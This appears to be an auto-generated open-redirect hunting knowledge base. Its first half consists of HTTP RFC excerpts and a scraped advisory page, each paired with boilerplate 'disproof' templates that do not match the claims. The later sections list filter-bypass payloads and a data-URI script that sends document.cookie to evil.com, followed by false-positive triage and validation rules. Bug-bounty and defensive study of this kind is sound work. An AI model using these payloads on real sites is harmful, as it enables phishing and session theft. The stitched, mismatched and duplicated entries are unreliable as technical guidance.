**There are several types of redirects: Redirects that indicate the resource might be available at a different URI, as provided by the Location field, as in the status codes 301 (Moved Permanently) , 302 (Found) , and 307 (Temporary Redirect) .**

the request. If a Location header field ( Section 7.1.2 ) is provided, the user agent MAY automatically redirect its request to the URI referenced by the Location field value, even if the specific status code is not understood. Automatic redirection needs to done with care for methods not known to be safe , as defined in Section 4.2.1 , since the user might not wish to redirect an unsafe request. There are several types of redirects: Redirects that indicate the resource might be available at a different URI, as provided by the Location field, as in the status codes 301 (Moved Permanently) , 302 (Found) , and 307 (Temporary Redirect) . Redirection that offers a choice of matching resources, each capable of representing the original request target, as in the 300 (Multiple Choices) status code. Redirection to a different resource, identified by the Location field, that can represent an indirect response to the request, as in the 303 (See Other) status code. Redirection to a previously cached result, as in the 304 (Not Modified) s

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“There are several types of redirects: Redirects that indicate the resource might”) does not occur under a test that isolates that control.

**Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response.**

ed from the origin server. This response is intended to support a common data entry use case where the user receives content that supports data entry (a form, notepad, canvas, etc.), enters or manipulates data in that space, causes the entered data to be submitted in a request, and then the data entry mechanism is reset for the next entry so that the user can easily initiate another input action. Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response. In other words, a server MUST do one of the following for a 205 response: a) indicate a zero-length body for the response by including a Content-Length header field with a value of 0; b) indicate a zero-length payload for the response by including a Transfer-Encoding header field with a value of chunked and a message body consisting of a single chunk of zero-length; or, c) close the connection im

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Since the 205 status code implies that no additional content will be provided, a”) does not occur under a test that isolates that control.

**If no payload is desired, an origin server ought to send 204 (No Content) instead.**

representation of the status of, or results obtained from, the action; PUT, DELETE a representation of the status of the action; OPTIONS a representation of the communications options; TRACE a representation of the request message as received by the end server. Aside from responses to CONNECT, a 200 response always has a payload, though an origin server MAY generate a payload body of zero length. If no payload is desired, an origin server ought to send 204 (No Content) instead. For CONNECT, no payload is allowed because the successful result is a tunnel, which begins immediately after the 200 response header section. A 200 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234] ). 6.3.2.   201 Created The 201 (Created) status code indicates that the request has been fulfilled

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If no payload is desired, an origin server ought to send 204 (No Content) instea”) does not occur under a test that isolates that control.

**A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.**

know how each of its resource identifiers corresponds to an implementation and how each implementation manages to select and send a current representation of the target resource in a response to GET. A client can alter the semantics of GET to be a "range request", requesting transfer of only some part(s) of the selected representation, by sending a Range header field in the request ( [RFC7233] ). A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request. The response to a GET request is cacheable; a cache MAY use it to satisfy subsequent GET and HEAD requests unless otherwise indicated by the Cache-Control header field ( Section 5.2 of [RFC7234] ). 4.3.2.   HEAD The HEAD method is identical to GET except that the server MUST NOT send a message body in the response (i.e., the response terminates at the end of the header section). The server SHOULD

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A payload within a GET request message has no defined semantics; sending a paylo”) does not occur under a test that isolates that control.

**Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block.**

first to learn about latest tools, advisories, and findings. 
 
 
 
 
 
 

 
 
 Thank You! You have been subscribed. 
 
 
 
 
 
 

 
 
 

 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 Recommended Posts 
 
 You might be interested in these related posts. 
 
 
 
 
 
 
 
 
 
 
 
 Advisories Blog 
 Zilliz / Attu | 2.6.5 
 
 
 
 
 
 
 
 
 
 
 
 Two vulnerabilities in Zilliz Attu 2.6.5 chain into something serious. Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defeats the private IP block. Bishop Fox turned both into full Kubernetes namespace takeover in a cloud deployment. Update to 3.0.0 now. 
 
 
 
 
 Read Post
 
 
 
 
 

 
 

 
 
 
 
 
 
 Advisories Blog 
 Traefik | Version Through 3.7.11 
 
 
 
 
 
 
 
 
 
 
 
 Traefik's request read timeout is enabled by default and documented without exception, but it has never applied to HTTP/3. Bishop Fox confirmed the gap across four year

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Missing authentication lets anyone proxy requests unauthenticated, and a regex bypass defe".

**The server SHOULD send the same header fields in response to a HEAD request as it would have sent if the request had been a GET, except that the payload header fields ( Section 3.3 ) MAY be omitted.**

ject the request. The response to a GET request is cacheable; a cache MAY use it to satisfy subsequent GET and HEAD requests unless otherwise indicated by the Cache-Control header field ( Section 5.2 of [RFC7234] ). 4.3.2.   HEAD The HEAD method is identical to GET except that the server MUST NOT send a message body in the response (i.e., the response terminates at the end of the header section). The server SHOULD send the same header fields in response to a HEAD request as it would have sent if the request had been a GET, except that the payload header fields ( Section 3.3 ) MAY be omitted. This method can be used for obtaining metadata about the selected representation without transferring the representation data and is often used for testing hypertext links for validity, accessibility, and recent modification. A payload within a HEAD request message has no defined semantics; sending a payload body on a HEAD request might cause some existing implementations to reject the request. T

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The server SHOULD send the same header fields in response to a HEAD request as i”) does not occur under a test that isolates that control.

**A 100-continue expectation informs recipients that the client is about to send a (presumably large) message body in this request and wishes to receive a 100 (Continue) interim response if the request-line and header fields are not sufficient to cause an immediate success, redirect, or error response.**

to be supported by the server in order to properly handle this request. The only such expectation defined by this specification is 100-continue . Expect = "100-continue"
 The Expect field-value is case-insensitive. A server that receives an Expect field-value other than 100-continue MAY respond with a 417 (Expectation Failed) status code to indicate that the unexpected expectation cannot be met. A 100-continue expectation informs recipients that the client is about to send a (presumably large) message body in this request and wishes to receive a 100 (Continue) interim response if the request-line and header fields are not sufficient to cause an immediate success, redirect, or error response. This allows the client to wait for an indication that it is worthwhile to send the message body before actually doing so, which can improve efficiency when the message body is huge or when the client anticipates that an error is likely (e.g., when sending a state-changing method, for the first time, without previously verified authentication credentials). For example, a request that begins with P

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A 100-continue expectation informs recipients that the client is about to send a”) does not occur under a test that isolates that control.

**A payload within a DELETE request message has no defined semantics; sending a payload body on a DELETE request might cause some existing implementations to reject the request.**

ELETE method is successfully applied, the origin server SHOULD send a 202 (Accepted) status code if the action will likely succeed but has not yet been enacted, a 204 (No Content) status code if the action has been enacted and no further information is to be supplied, or a 200 (OK) status code if the action has been enacted and the response message includes a representation describing the status. A payload within a DELETE request message has no defined semantics; sending a payload body on a DELETE request might cause some existing implementations to reject the request. Responses to the DELETE method are not cacheable. If a DELETE request passes through a cache that has one or more stored responses for the effective request URI, those stored responses will be invalidated (see Section 4.4 of [RFC7234] ). 4.3.6.   CONNECT The CONNECT method requests that the recipient establish a tunnel to the destination origin server identified by the request-target and, if succ

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“A payload within a DELETE request message has no defined semantics; sending a pa”) does not occur under a test that isolates that control.

**If the result of processing a POST would be equivalent to a representation of an existing resource, an origin server MAY redirect the user agent to that resource by sending a 303 (See Other) response with the existing resource's identifier in the Location field.**

ection 4.2.1 of [RFC7234] ). However, POST caching is not widely implemented. For cases where an origin server wishes the client to be able to cache the result of a POST in a way that can be reused by a later GET, the origin server MAY send a 200 (OK) response containing the result and a Content-Location header field that has the same value as the POST's effective request URI ( Section 3.1.4.2 ). If the result of processing a POST would be equivalent to a representation of an existing resource, an origin server MAY redirect the user agent to that resource by sending a 303 (See Other) response with the existing resource's identifier in the Location field. This has the benefits of providing the user agent a resource identifier and transferring the representation via a method more amenable to shared caching, though at the cost of an extra request if the user agent does not already have the representation cached. 4.3.4.   PUT The PUT method requests that the state of the target resource be created or replaced with the state defined by the representat

*Disproof:* Refuted when: the resolved Location host is the intended origin, so no request ever leaves the application. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If the result of processing a POST would be equivalent to a representation of an”) does not occur under a test that isolates that control.

**If the request method is GET or HEAD and the response status code is 203 (Non-Authoritative Information) , the payload is a potentially modified or enhanced representation of the target resource as provided by an intermediary.**

a representation of the resource identified by the Content-Location field-value. However, such an assertion cannot be trusted unless it can be verified by other means (not defined by this specification). The information might still be useful for revision history links. Otherwise, the payload is unidentified. For a response message, the following rules are applied in order until a match is found: If the request method is GET or HEAD and the response status code is 200 (OK) , 204 (No Content) , 206 (Partial Content) , or 304 (Not Modified) , the payload is a representation of the resource identified by the effective request URI ( Section 5.5 of [RFC7230] ). If the request method is GET or HEAD and the response status code is 203 (Non-Authoritative Information) , the payload is a potentially modified or enhanced representation of the target resource as provided by an intermediary. If the response has a Content-Location header field and its field-value is a reference to the same URI as the effective request URI, t

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“If the request method is GET or HEAD and the response status code is 203 (Non-Au”) does not occur under a test that isolates that control.

**A client that generates an OPTIONS request containing a payload body MUST send a valid Content-Type header field describing the representation media type.**

A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response. A client MAY send a Max-Forwards header field in an OPTIONS request to target a specific recipient in the request chain (see Section 5.1.2 ). A proxy MUST NOT generate a Max-Forwards header field while forwarding a request unless that request was received with a Max-Forwards field. A client that generates an OPTIONS request containing a payload body MUST send a valid Content-Type header field describing the representation media type. Although this specification does not define any use for such a payload, future extensions to HTTP might use the OPTIONS body to make more detailed queries about the target resource. Responses to the OPTIONS method are not cacheable. 4.3.8.   TRACE The TRACE method requests a remote, application-level loop-back of the request message. The final recipient of the request SHOULD reflect the message r

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "A client that generates an OPTIONS request containing a payload body MUST send a valid Con".

**An origin server that allows PUT on a given target resource MUST send a 400 (Bad Request) response to a PUT request that contains a Content-Range header field ( Section 4.2 of [RFC7233] ), since the payload is likely to be partial content that has been mistakenly PUT as a full representation.**

resource) that is separate from the URIs identifying each particular version (different resources that at one point shared the same state as the current version resource). A successful PUT request on "the current version" URI might therefore create a new version resource in addition to changing the state of the target resource, and might also cause links to be added between the related resources. An origin server that allows PUT on a given target resource MUST send a 400 (Bad Request) response to a PUT request that contains a Content-Range header field ( Section 4.2 of [RFC7233] ), since the payload is likely to be partial content that has been mistakenly PUT as a full representation. Partial content updates are possible by targeting a separately identified resource with state that overlaps a portion of the larger resource, or by using a different method that has been specifically defined for partial updates (for example, the PATCH method defined in [RFC5789] ). Responses to the PUT method are not cacheable. If a successful PUT request passes through a cache that has one or mo

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“An origin server that allows PUT on a given target resource MUST send a 400 (Bad”) does not occur under a test that isolates that control.

**In a response to a HEAD request, the representation header fields describe the representation data that would have been enclosed in the payload body if the same request had been a GET.**

evaluating conditional requests [RFC7232] and constructing the payload for 200 (OK) and 304 (Not Modified) responses to GET ( Section 4.3.1 ). 3.1.   Representation Metadata Representation header fields provide metadata about the representation. When a message includes a payload body, the representation header fields describe how to interpret the representation data enclosed in the payload body. In a response to a HEAD request, the representation header fields describe the representation data that would have been enclosed in the payload body if the same request had been a GET. The following header fields convey representation metadata: Header Field Name Defined in... Content-Type Section 3.1.1.5 Content-Encoding Section 3.1.2.2 Content-Language Section 3.1.3.2 Content-Location Section 3.1.4.2 3.1.1.   Processing Representation Data 3.1.1.1.   Media Type HTTP uses Internet media types [RFC2046] in the Content-Type ( Section 3.1.1.5 ) and Accept ( Section 5.3.2 ) header

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“In a response to a HEAD request, the representation header fields describe the r”) does not occur under a test that isolates that control.

**In practice, resource owners do not always properly configure their origin server to provide the correct Content-Type for a given representation, with the result that some clients will examine a payload's content and override the specified type.**

ender that generates a message containing a payload body SHOULD generate a Content-Type header field in that message unless the intended media type of the enclosed representation is unknown to the sender. If a Content-Type header field is not present, the recipient MAY either assume a media type of "application/octet-stream" ( [RFC2046] , Section 4.5.1 ) or examine the data to determine its type. In practice, resource owners do not always properly configure their origin server to provide the correct Content-Type for a given representation, with the result that some clients will examine a payload's content and override the specified type. Clients that do so risk drawing incorrect conclusions, which might expose additional security risks (e.g., "privilege escalation"). Furthermore, it is impossible to determine the sender's intent by examining the data format: many data formats match multiple media types that differ only in processing semantics. Implementers are encouraged to provide a means of disabling such "content sniffing" whe

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "In practice, resource owners do not always properly configure their origin server to provi".

**This flexibility regarding line breaks applies only to text within a representation that has been assigned a "text" media type; it does not apply to "multipart" types or HTTP elements outside the payload body (e.g., header fields).**

s the transfer of text media with plain CR or LF alone representing a line break, when such line breaks are consistent for an entire representation. An HTTP sender MAY generate, and a recipient MUST be able to parse, line breaks in text media that consist of CRLF, bare CR, or bare LF. In addition, text media in HTTP is not limited to charsets that use octets 13 and 10 for CR and LF, respectively. This flexibility regarding line breaks applies only to text within a representation that has been assigned a "text" media type; it does not apply to "multipart" types or HTTP elements outside the payload body (e.g., header fields). If a representation is encoded with a content-coding, the underlying data ought to be in a form defined above prior to being encoded. 3.1.1.4.   Multipart Types MIME provides for a number of "multipart" types — encapsulations of one or more representations within a single message body. All multipart types share a common syntax, as defined in Section 5.1.1 of [RFC2046] , and include a boundary par

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“This flexibility regarding line breaks applies only to text within a representat”) does not occur under a test that isolates that control.

**A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response.**

plemented by the server and applicable to the target resource (e.g., Allow ), including potential extensions not defined by this specification. The response payload, if any, might also describe the communication options in a machine or human-readable representation. A standard format for such a representation is not defined by this specification, but might be defined by future extensions to HTTP. A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response. A client MAY send a Max-Forwards header field in an OPTIONS request to target a specific recipient in the request chain (see Section 5.1.2 ). A proxy MUST NOT generate a Max-Forwards header field while forwarding a request unless that request was received with a Max-Forwards field. A client that generates an OPTIONS request containing a payload body MUST send a valid Content-Type header field des

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "A server MUST generate a Content-Length field with a value of "0" if no payload body is to".

**The response payload, if any, might also describe the communication options in a machine or human-readable representation.**

arget is not an asterisk, the OPTIONS request applies to the options that are available when communicating with the target resource. A server generating a successful response to OPTIONS SHOULD send any header fields that might indicate optional features implemented by the server and applicable to the target resource (e.g., Allow ), including potential extensions not defined by this specification. The response payload, if any, might also describe the communication options in a machine or human-readable representation. A standard format for such a representation is not defined by this specification, but might be defined by future extensions to HTTP. A server MUST generate a Content-Length field with a value of "0" if no payload body is to be sent in the response. A client MAY send a Max-Forwards header field in an OPTIONS request to target a specific recipient in the request chain (see Section 5.1.2 ). A proxy

*Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The response payload, if any, might also describe the communication options in a”) does not occur under a test that isolates that control.

**When a site bounces the browser to a login prompt, the redirect parameter carried in that login URL (next, retUrl) is the post-login destination the user influences, so it is the parameter to fuzz.**

When a site bounces the browser to a login prompt, the redirect parameter carried in that login URL (next, retUrl) is the post-login destination the user influences, so it is the parameter to fuzz.

HackTricks reference: find openredirect trick (https://kathan19.gitbook.io/howtohunt/open-redirection/find_openredirect_trick.md)

*Disproof:* The redirect parameter refuses external hosts or ignores off-site values and always resolves to a fixed internal path.

**When a site bounces the browser to a login prompt, the redirect parameter carried in that login URL (next, retUrl) is the post-login destination the user influences, so it is the parameter to fuzz.**

When a site bounces the browser to a login prompt, the redirect parameter carried in that login URL (next, retUrl) is the post-login destination the user influences, so it is the parameter to fuzz.

HackTricks reference: find openredirect trick (https://kathan19.gitbook.io/howtohunt/open-redirection/find_openredirect_trick.md)

*Disproof:* The redirect parameter refuses external hosts or ignores off-site values and always resolves to a fixed internal path.

## Variations

**Validator filters that check only the scheme or a fixed denylist are bypassable using protocol-relative URLs (//evil.com), userinfo tricks (https://***@evil.com), backslashes (/\evil.com), URL-encoding, null-byte truncation, and tab/newline injection.**

1) Probe the redirect parameter for scheme/environment validation. 2) Send //evil.com to test protocol-relative bypass. 3) Send https://***@evil.com (userinfo) to test host-parsing normalization differences between the validator and the browser. 4) Send /\evil.com (backslash) or java%0d%0ascript:alert(1) to defeat case- or keyword-sensitive denylists. 5) Use tab (%09) or newline injection to bypass regex anchors. 6) Confirm by following the redirect in a browser and observing navigation to the attacker domain. Document each bypass class: protocol-relative, userinfo, backslash, encoding, and CRLF confusion.

*Disproof:* If the application resolves the target through a strict allowlist, if it URL-decodes and canonicalizes the host before comparison, or if it validates against the fully resolved final URL, the bypass fails.

**An open-redirect defence that inspects the destination with a real URL parser and compares the host is bypassed by any implementation that does a substring, suffix or endsWith test on the raw string, because a value such as an attacker host whose name merely contains the allowed host, or an allowed host with a trailing credential-holding prefix, satisfies the substring test while resolving elsewhere.**

Mechanism: An open-redirect defence that inspects the destination with a real URL parser and compares the host is bypassed by any implementation that does a substring, suffix or endsWith test on the raw string, because a value such as an attacker host whose name merely contains the allowed host, or an allowed host with a trailing credential-holding prefix, satisfies the substring test while resolving elsewhere. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is false when the check parses with a WHATWG-compatible URL constructor and compares the parsed host for exact equality, because the confusable forms then fail to match and no substring confusion is possible; a check that also rejects relative and scheme-relative input closes the remaining variants.

*Disproof:* The rule is false when the check parses with a WHATWG-compatible URL constructor and compares the parsed host for exact equality, because the confusable forms then fail to match and no substring confusion is possible; a check that also rejects relative and scheme-relative input closes the remaining variants.

**When a redirect destination is reflected into a JavaScript navigation sink (window.location, document.location, location.href, $.redirect), attacker-supplied javascript: or data: URIs escape validation and execute arbitrary script in the victim's browser (DOM-based XSS).**

1) Find a redirect parameter whose value is interpolated into JavaScript (e.g. location.href = input or window.location.replace(input)). 2) Send a javascript: URI such as ?url=javascript:alert(document.domain). 3) Send a data: URI to exfiltrate data: ?url=data:text/html,<script>document.location='https://evil.com/steal?c='+document.cookie</script>. 4) The script executes in the origin of the trusted domain, enabling session-token theft and UI redressing. 5) Report this as DOM-based XSS, escalated from the base open redirect, separately from the transport flaw.

*Disproof:* If the application escapes or strips the scheme before reflecting the value into a JavaScript sink, if it validates the target against an allowlist, or if the redirect is performed at the server (HTTP 3xx) rather than in the browser, the javascript: or data: URI never executes.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `chain.open_redirect.auto.01` — open_redirect: observe, exercise, confirm (goal: `Establish, exercise and confirm a open_redirect condition on an authorised target without relying on anyone else's data.`)

## Real-World Examples

Not yet researched.

## Common False Positives

**A 3xx response whose Location value is a relative reference (/login, ~/folder/Login.aspx, ../dashboard) or an absolute URL on the request's own origin is not an open redirect, because URL resolution against the current base keeps the navigation on the same origin, so no untrusted site ever receives the victim.**

Mechanism: per URL resolution, a Location value without a scheme and authority inherits both from the request URL, so /login and ~/folder/Login.aspx as emitted by sendRedirect/header('Location: ...')/Response.Redirect stay on the reporting host; the code, not the parameter, decides the destination host. The distinguishing check is to resolve the observed Location value against the request URL and compare the resulting scheme+host+port with the request's own: equal means no cross-origin navigation, so the phishing precondition in CWE-601 (user is redirected to an untrusted page while the visible link still shows the trusted name) is absent. Triage: request the endpoint with url=https://evil.example and with url=//evil.example and watch the effective request target in the network log — if the browser resolves both to the reporting origin's host (or the server replaces them with a fixed in-code URL), the finding is a false positive for open redirect and should be re-filed, if anything, as unvalidated input reaching a header sink.

*Disproof:* The rule fails if the resolved value's authority differs from the request origin in any way the browser honours: a protocol-relative //evil.example, a backslash form \evil.example that some clients normalise to //, an absolute URL with a userinfo part (https://app.example.com@evil.example), a same-origin-looking host that is actually a subdomain of an attacker domain, or a value that the framework rewrites (for example a Rails redirect_to that expands a model attribute, or a 307 that replays the body to another origin). Any of those means the string after resolution is off-origin and the finding is real.

**A redirect parameter whose value must resolve to a path on the application's own origin is not an open redirect; the finding requires the attacker to control the destination origin, not merely the path or the query string that follows the application's own host.**

Mechanism: A redirect parameter whose value must resolve to a path on the application's own origin is not an open redirect; the finding requires the attacker to control the destination origin, not merely the path or the query string that follows the application's own host. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is wrong when the value is resolved by a client rather than the server — a protocol-relative value, a scheme-relative or backslash-normalised form, or a value that a downstream client (email client, chat renderer, mobile deep-link handler) reinterprets as absolute — because the server-side check passes while the user agent still leaves the origin.

*Disproof:* The rule is wrong when the value is resolved by a client rather than the server — a protocol-relative value, a scheme-relative or backslash-normalised form, or a value that a downstream client (email client, chat renderer, mobile deep-link handler) reinterprets as absolute — because the server-side check passes while the user agent still leaves the origin.

**A next=/returnUrl= parameter whose reflected value only occupies the path, query or fragment of a Location value whose scheme and authority are fixed in code is not an open redirect, because the browser resolves the authority from the code and only a same-origin path segment is attacker-controlled.**

Mechanism: the setter builds the redirect as a fixed prefix plus attacker text, for example header("Location: https://app.example.com/go?next=" . $_GET['next']) or Response.Redirect("/account/return?to=" + to). The only field the attacker controls is the tail of the path/query, so the browser navigates to app.example.com and the off-domain string is never dereferenced; it is inert data shown to that same site. The check that separates true from false is whether the attacker can influence the BEGINNING of the URL (scheme and authority), not whether the string 'https://evil.example' appears anywhere in the response. Triage test: replace the value with //evil.example/x and with @evil.example and see whether the request leaves the origin; if the browser stays on app.example.com in both cases, the finding is a reflected-parameter or link-content issue, not an open redirect. Recorded in CWE-601 detection guidance, which names input influence over the beginning of a URL as the thing that matters for reducing false positives, and the OWASP cheat sheet's rule that only values validated against a list of trusted URLs/hosts may be used as a redirect destination.

*Disproof:* The rule stops being true the moment the attacker can reach the scheme or authority: a Location value that is the bare parameter (Location: <user>), a value concatenated without a separator after the host so that user input supplies userinfo or a new authority (https://app.example.com@evil.example, //evil.example, \evil.example, or a value beginning with a scheme), a prefix assembled by string concatenation from a configurable base, or a second redirect hop where the stored off-domain string is itself used as the next Location. Any of those makes the same reflected string the actual navigation target and the finding real.

**An authorization server answering with a `redirect_uri_mismatch` error has refused the unregistered destination, so that exchange is the authorisation server's defence working and must not be reported as an open redirect on the client.**

Mechanism: An authorization server answering with a `redirect_uri_mismatch` error has refused the unregistered destination, so that exchange is the authorisation server's defence working and must not be reported as an open redirect on the client. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The rule is wrong when the client is the component at fault — it holds a pre-registered wildcard or prefix pattern that the server honours, so an attacker's host matches a registered pattern and the code is returned to it — or when the mismatch is only for the tested variant while a weaker registered form still accepts the malicious origin, in which case the server's exact-match rule is not what stopped the attack.

*Disproof:* The rule is wrong when the client is the component at fault — it holds a pre-registered wildcard or prefix pattern that the server honours, so an attacker's host matches a registered pattern and the code is returned to it — or when the mismatch is only for the tested variant while a weaker registered form still accepts the malicious origin, in which case the server's exact-match rule is not what stopped the attack.

**A 301/302 whose Location is a relative path, a protocol-relative same-origin path, or an absolute URL whose authority equals the request Host is not an open redirect: the browser cannot be moved off the origin, so there is no phishing pivot and no token or credential leakage to a foreign authority.**

Parse the Location value with the same algorithm the browser uses and compare authority against the request Host, port and scheme included. ZAP's own remediation for this class is exactly this check: safe redirect functionality redirects only to relative URIs or to a list of trusted domains, which means a relative-path Location is the fixed behaviour, not the bug. The genuine variant, documented in Zscaler's research, is an endpoint that will redirect to any domain the caller supplies - a warning or interstitial page used as a redirector - and there the authority genuinely leaves the origin. Same signal (user input in the Location header), opposite verdict; the only discriminator is the resolved authority.

*Disproof:* The redirect IS open if the authority differs after full parsing - userinfo tricks that put an attacker host in the userinfo field, backslash or tab/CR injection that browsers normalise into an authority, punycode/IDN homographs, an open redirector the app itself chains to, or a relative path the front-end router resolves against an attacker-controlled protocol/host. Resolve the Location through a real browser parser before accepting it as same-origin.

**A tenant's OAuth authorize endpoint redirecting to an arbitrary external origin is the third-party application's registered redirect_uri, not an open redirect in the tenant's own web application.**

The observation is a request to a first-party-looking Microsoft or Google authorize URL that returns a 302 to an attacker domain, which scans as a textbook open redirect on a trusted host. A distinct class of redirection abuse puts the redirection target URL in the OAuth provider's framework: the third-party application registration, where no validation of that URL is applied by the application, and the redirection target URL will be missing from the legitimate URL. The detection that fires is therefore on the identity provider's redirect endpoint, but the controllable value lives in the tenant's consent record for a specific client id, not in any parameter the web application hands to the browser. The benign explanation is that the tenant's administrators or a sanctioned integration registered that client with that redirect_uri. The distinguishing test is attribution: replay the same redirect chain while substituting a client id the tenant never registered, or one registered with a different redirect_uri. If the arbitrary destination only ever appears for a known client id, it is a tenant configuration review item (a malicious or over-permissive app consent), not a web application redirect flaw to be fixed in code.

*Disproof:* The arbitrary external destination is reachable with a client id the tenant never registered, or with a registered client id whose redirect_uri is fixed to the application's own origin, which shows the redirection value is attacker-supplied in the request rather than tenant-configured.
**Hypothesis:** An endpoint reflects a redirect parameter into the Location header, therefore it is an open redirect
- Invalidated by: The 302 pointed back at the same host with the parameter echoed into the URL. No request ever left the origin, so an attacker cannot place their page in the redirect chain
- **Rejection rule:** A reflected redirect parameter is not an open redirect. Resolve the Location and confirm the 3xx leaves the origin: a same-host 302 with the parameter echoed is not a finding, and 'reflected parameter' alone will be read as padding on review

## Validation

**An open redirect is validated by reaching a controlled host through the parameter with the Location header captured, not by the presence of a 302 alone.**

Send an absolute URL to your own collector as the destination parameter and capture the exact Location header returned. Then test whether validation is a real allowlist or a naive check by trying a near-miss host such as the trusted domain prefixed onto your collector. If the near-miss is accepted, the destination check is bypassable and the finding is confirmed at the bypass level.

*Disproof:* If the controlled host never appears in any Location header across absolute, relative and near-miss variants, the redirect is not user-controllable and validation fails.

**An open redirect is proved by a 3xx response whose Location header resolves to an attacker-controlled origin, captured with the redirect not followed; the presence of a `next`, `returnUrl` or `redirect` parameter on a request that returned 200 proves nothing.**

Mechanism: An open redirect is proved by a 3xx response whose Location header resolves to an attacker-controlled origin, captured with the redirect not followed; the presence of a `next`, `returnUrl` or `redirect` parameter on a request that returned 200 proves nothing. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: The claim is false when the response cannot be observed with its headers intact — a fetch-based client, a proxy that rewrites 3xx, or a headless browser configured to follow redirects — in which case the Location must be captured from a raw exchange or from the browser's network log, and a screenshot of the final page is insufficient evidence.

*Disproof:* The claim is false when the response cannot be observed with its headers intact — a fetch-based client, a proxy that rewrites 3xx, or a headless browser configured to follow redirects — in which case the Location must be captured from a raw exchange or from the browser's network log, and a screenshot of the final page is insufficient evidence.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from open_redirect.fp_rule.a_same_site_relative_path_redirect_is_not_an_open_redirect, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (open_redirect.fp_rule.a_same_site_relative_path_redirect_is_not_an_open_redirect) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from open_redirect.fp_rule.an_oauth_redirect_uri_mismatch_error_is_a_rejected_request_not_an_open_redirect, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

